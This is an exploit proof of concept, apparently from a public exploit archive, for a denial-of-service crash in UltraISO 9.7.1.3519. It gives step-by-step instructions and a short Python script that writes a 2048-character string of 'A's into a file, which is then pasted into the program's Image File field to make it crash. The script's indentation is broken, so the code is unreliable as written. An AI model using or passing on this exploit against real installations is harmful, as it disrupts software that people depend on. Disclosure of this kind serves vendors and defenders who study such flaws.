# Exploit Title : UltraISO 9.7.1.3519 - Denial Of Service (PoC)
# Exploit Author : Ali Alipour
# WebSite : Alipour.it
# Date: 2018-08-22
# Vendor Homepage : https://www.ultraiso.com
# Software Link Download : https://www.ultraiso.com/download.html
# Tested on : Windows 10 - 64-bit

# Steps to Reproduce
# Run the python exploit script, it will create a new 
# file with the name "exploit.txt" just copy the text inside "exploit.txt"
# and start the UltraISO program. 
# In the new window click "Tools" > "Mount To Virtual Drive" . 
# Now Paste the content of "exploit.txt" into the field: " Image File ". 
# Click "Mount" and you will see a crash.

#!/usr/bin/env python
buffer = "\x41" * 2048
	f = open ("exploit.txt", "w")
	f.write(buffer)
	f.close()